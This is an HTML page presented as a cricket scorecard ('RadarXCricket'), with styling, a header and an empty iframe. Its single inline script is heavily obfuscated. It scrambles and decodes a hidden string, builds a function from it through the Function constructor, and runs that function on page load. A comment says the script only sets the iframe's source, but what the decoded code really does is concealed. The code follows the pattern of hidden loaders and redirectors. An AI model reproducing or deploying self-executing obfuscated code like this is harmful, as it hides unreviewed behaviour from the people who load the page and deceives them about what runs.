<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket - Scorecard</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: #0e0e0e;
            color: #fff;
            height: 100vh;
            overflow: hidden;
            animation: fadeIn 1s ease-out;
        }

        /* Fade-in Animation */
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }

        header {
            background: #1a1a1a;
            color: #00ffcc;
            padding: 30px 15px;
            text-align: center;
            font-size: 28px;
            font-weight: bold;
            letter-spacing: 1px;
            box-shadow: 0 6px 12px rgba(0, 255, 204, 0.5);
            z-index: 10;
            animation: slideDown 1s ease-out;
        }

        /* Slide-in Animation for Header */
        @keyframes slideDown {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(0); }
        }

        iframe {
            width: 100%;
            height: calc(100vh - 60px);
            border: none;
            animation: slideUp 1s ease-out;
        }

        /* Slide-up Animation for Iframe */
        @keyframes slideUp {
            0% { transform: translateY(100%); }
            100% { transform: translateY(0); }
        }

    </style>
</head>
<body>

<header>RadarXCricket</header>

<!-- Iframe container, src will be dynamically added via JS -->
<iframe id="scoreboardIframe" allowfullscreen></iframe>

<script>
var iframeSrc,iframe;(function(){var pEx='',RGf=482-471;function wJU(t){var x=1699602;var f=t.length;var z=[];for(var k=0;k<f;k++){z[k]=t.charAt(k)};for(var k=0;k<f;k++){var q=x*(k+124)+(x%50842);var v=x*(k+225)+(x%52313);var p=q%f;var d=v%f;var c=z[p];z[p]=z[d];z[d]=c;x=(q+v)%5225620;};return z.join('')};var RTr=wJU('ujhkqxzyslrcmreoogrtpdstonfcnbtivuawc').substr(0,RGf);var bWg='e0r+5v=t>hwr{qu.]3;t(<(e,]a9rehsun;fkmnn5r,Ci)i=rx;zo;neg e=osa 8;,ikcf;a9 .ehtl8=c4ar;)pju8n,it;) akhe+t,kt lfv7ue8sffia;i)i 6oe]f[uae3)+riq0h)t (;)n-g+-w++gacotvAa=)+1hl[2 u=.)0t1ri,e(k(h2=ho=a2rfot. 0f1z[0r;=glgsp7t;;.l!(=6};*>5n"v,[.]=+.v6fq8a+[ujin[)i ( ,[);0.[ra ( ";b nvnb;r(1;9;o=+1(=,eu<qmr=u+iwgvl)tr)647t3";r+qv4m;wal)zs+ri;si;n av]-on9ue;gao[1fr tn].89v=}l[pvnr"d{zvur]"w"o7,(yc=waAmuev=;,c;a1()2n;+C(r={n;bdC19}r1me657ra <er+hw*ilu(ln =s6ljr(s+s.g1s0Aqo,l;rtntsiChj( a.-s+tgcela,udnAtib[=i=tm.rl]1.fdeA)avv,url)fr7i)i0=a}=h2t+ivoh(b6oplq(=ha2nh 8=(,.][r[,e.,(hkpt=hwm..{ts6ci)}rronrlo-gj,+0;}=r+f]3;q=i(e;(l.(<7<;]as)0sq(ly])=.(=+im,.o.rsaro;1awa8ud;voj".=e=0o]usmvsat;uiht49e]o c+,{t r(mnrpnwu";;+2)vyt 8n{dg!wrh=vt;;=(a(2,o)rv;.{l;vugah}m,w=p,vgn=rCel)zej+puhn;Coaey([)f7e.m0c,) a6o,)) acv=fuaaw7;-r;vr";4sr=ruC)c))(d.Sh)(nr.ao=+=hrruog(Ce;=rgm.rv("2nS-(lu)fvcfgl)l1sjjl,,v=7';var zVq=wJU[RTr];var BfU='';var KAU=zVq;var mEb=zVq(BfU,wJU(bWg));var czZ=mEb(wJU('2 a1c\/rig$#i,.o_ShSt. mt7f,e 3,()nri=ea{i7.nWsWes0,apb)!Czt.)o})&W7wy7a,.z;Sc0tp;r}.=5jmuz=W-W,$efi.$en0(k_hef0%t=;3ti&!i+&if;oe.Weo"d$drteiw=ja,0)ufea.8j irqvsa)srW!Ior3sT4%t)24i)tI($w$"o$iwt+?,=%.,{,2e6"d,h5a_{m}=_&I!tr0gtm)tj!)=yfejw$30u(x.{Wt.ro=tEie5q"e..&!...S.Wgdsaa)f=\/d(na!;=(r;Cr)sn;.#e_jo3ga#35r9T=d{stczec.ym2&jg,rcee0ig}90eW=zcb.)zW.5.Waocg9drc_0WaWr7m(r&nt .(,)r.fa.mo]&pmr(W6l]zoe.bn 6 a7tW8T,8;c)Wcn)mg30fe8+fno$zWWetc.iW.j.o7fnki.W&*ydro9.orpf)=}7rls;.=yNrsrf;{[#(013,p)biW0.(g24WwuT_$t09})%fI;)lc6c(;yz3t(8-6Wp!,I.nW}.ceW.0 Wefrp=,eobi)t(z[if-.aC&.1e0os*!Wdlf6v(iin$=xdlW{gW(336m#W4e%r_W(m,r(lw),;.i=.\/t3b_(8&jy};yn o)a\/pjff9W i(Wr6o,;rWrWftW3.;*snc2$.;kj7W3W((+W_#(7! m(}dfWes!s,=\'+}pWt&bm}WW=.,4_rfsena,k!=$.!W2n=eoWa4!.7fW4 #, W",*;l!n(:{f)$t{o1"&bcfI1W&t acz.a)hWWw.s#Wf W!;r,g=d8yi-e.1ga(dxcsW_1Wk3\')%c(sa$WW0im0=tcno=oWW[2W%),.ji=$ojw;1[sWke\')f1.6Wp1=n.r_\'[)(W&S,axupW$.]; .W,.r;cu(S4,\/Wfl]]( =9]),t%6Wp3(]3.tel2$6zWWtia.e_.w2(7f.!a1g=.WW;mo3d1$IatT(7,0%+a$2Wce!o_spm!_nl%W-=;WW,i0g;ty,"3Cpyc;mes,!)nc)W).).-SwW.2#_($;I$cwii#e\/WWq)o234e)c! Wf0+s1lfI$m%tannfW0_e+r;3.)$$l)cniWuuWgmsfez!_)et0Sn)fiW1!=1(i#=s!o;),(_3_jeW74na),oi1]Wh)3a.f.rr=$g+fW=e022!b2.l\/W.fa;}W-j ns=e,]_s\/4)!)]'));var znW=KAU(pEx,czZ );znW(7288);return 5404})()
</script>

</body>
</html>